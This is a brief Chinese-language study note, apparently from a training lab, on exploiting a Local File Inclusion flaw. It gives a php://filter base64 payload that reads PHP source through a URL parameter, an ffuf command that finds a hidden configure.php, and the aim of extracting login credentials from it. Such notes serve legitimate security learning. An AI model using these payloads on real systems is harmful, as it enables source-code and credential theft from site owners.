# LFI(Local File Inclusion)

## 利用LFI漏洞读取php执行文件
正常执行服务器的en.php文件:
> http://<SERVER_IP>:<PORT>/index.php?language=en
 

---
不加文件后缀php是因为，服务器会自动追加，
不然就是
> http://<SERVER_IP>:<PORT>/index.php?language=en.php 
---

但若想直接查看该en.php文件的源码,
该文件首先要存在LFI(Local File Inclusion)漏洞，
使用浏览器执行:
> http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=en

则会得到该php文件源码的base64编码的字符串形式。
但要注意，base64编码字符串必须符合base64的padding规则，即字符串必须符合3的倍数，不够的情况下用1道2个“=”补足。
对该base64编码的字符串进行解码即可查看到源码。

## 利用ffuf模块(需安装)扫描
任务之一就是利用
> http://<SERVER_IP>:<PORT>/index.php?language=en

来找到config.php的源文件代码,以此读出登录名、密码等。
但因不知道config文件的具体名称和位置,
因此需要使用ffuf来探测上述接口,具体在本地或服务器上执行:
> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

可以看到config的文件名是configure.
因此,获取configure.php的源代码就和上述‘利用LFI漏洞读取php执行文件’一样了:
> http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=configure

fuff工具用途广泛，可用于多种用途：
* 目录发现，可选择在 URL 中的任何位置进行模糊测试。
* 子域名发现
* 使用各种 HTTP 方法进行模糊测试

(还未安装该模块，以后可以研究一下)

## base64加密及解密
使用base64进行编码：
``` Linux
[root@somebody]# echo "a" | base64
YQo=
```
使用base64进行解码：
``` Linux
[root@giantslayer1980 ~]# echo "YQo=" | base64 -d
a
```
依次,编码直接用 base64 ,可以多次编码,解码使用 base64 -d 即可。


